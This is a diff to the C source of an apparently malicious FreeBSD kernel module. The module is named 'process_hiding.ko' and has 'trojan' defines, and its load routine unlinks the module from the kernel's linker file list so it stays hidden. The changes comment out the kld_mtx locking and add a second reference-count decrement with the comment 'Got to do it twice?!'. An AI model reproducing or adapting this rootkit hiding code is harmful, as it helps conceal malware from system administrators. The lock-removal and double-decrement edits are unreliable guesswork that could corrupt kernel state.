@@ -25,8 +25,8 @@
 #include <vm/vm_page.h>
 #include <vm/vm_map.h>
 
-#include <dirent.h>
-
+#include <sys/queue.h>
+#include <sys/sx.h>
 
 // #define ORIGINAL	"/sbin/hello"
 // #define TROJAN		"/sbin/trojan_hello"
@@ -34,7 +34,7 @@
 #define VERSION		"process_hiding.ko"
 
 extern linker_file_list_t linker_files;
-extern struct mtx kld_mtx;
+//extern struct mtx kld_mtx;
 extern int next_file_id;
 
 typedef TAILQ_HEAD(, module) modulelist_t;
@@ -112,11 +112,12 @@ load(struct module *module, int cmd, void *arg)
 		struct module *mod;
 
 		mtx_lock(&Giant);
-		mtx_lock(&kld_mtx);
+		//mtx_lock(&kld_mtx);
 
 		/* Decrement the current kernel image's reference count. */
+		// Got to do it twice?!
 		(&linker_files)->tqh_first->refs--;
-
+		(&linker_files)->tqh_first->refs--;
 		/*
 		 * Iterate through the linker_files list, looking for VERSION.
 		 * If found, decrement next_file_id and remove from list.
@@ -129,7 +130,7 @@ load(struct module *module, int cmd, void *arg)
 			}
 		}
 
-		mtx_unlock(&kld_mtx);
+		//mtx_unlock(&kld_mtx);
 		mtx_unlock(&Giant);
 
 		sx_xlock(&modules_sx);
